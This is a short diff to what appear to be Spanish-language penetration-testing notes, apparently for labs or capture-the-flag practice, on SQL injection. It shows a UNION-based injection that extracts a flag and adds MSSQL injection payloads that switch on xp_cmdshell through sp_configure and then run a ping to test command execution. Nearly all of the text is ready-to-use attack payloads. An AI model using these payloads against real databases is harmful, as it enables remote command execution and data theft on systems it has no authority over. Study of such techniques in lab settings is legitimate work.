@@ -30,3 +30,13 @@ https://medium.com/@Shatha511/chaining-sqli-into-rce-a-lab-case-study-23590bb23a
 #Sacar valores
 1' AND 1=2 UNION SELECT 1, flag from flag.flag-- -
 ```
+
+- PARA MSSQL VIA WEB
+```bash
+test'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
+test'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
+
+Luego el ping:
+
+test'; EXEC xp_cmdshell 'ping -n 1 192.168.45.233';--
+```
